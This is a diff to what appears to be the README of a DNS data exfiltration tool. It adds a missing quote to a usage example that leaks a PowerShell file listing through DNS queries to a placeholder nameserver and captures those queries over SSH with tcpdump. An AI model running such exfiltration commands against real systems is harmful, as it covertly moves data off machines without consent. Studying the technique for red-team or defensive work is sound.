@@ -39,7 +39,7 @@ Contents of dispatcher.sh:
 
 3. powershell example where we ssh into our NS to get the incoming DNS requests.
 ```bash
-./dns_data_exfiltration.sh -w -h yourdns.ns -d "Resolve-DnsName" -x dispatcher.sh -c 'gci | % {$_.Name}' -- stdbuf -oL ssh -i key user@HOST 'sudo tcpdump --immediate -l udp port 53
+./dns_data_exfiltration.sh -w -h yourdns.ns -d "Resolve-DnsName" -x dispatcher.sh -c 'gci | % {$_.Name}' -- stdbuf -oL ssh -i key user@HOST 'sudo tcpdump --immediate -l udp port 53'
 ```
 
 Contents of dispatcher.sh
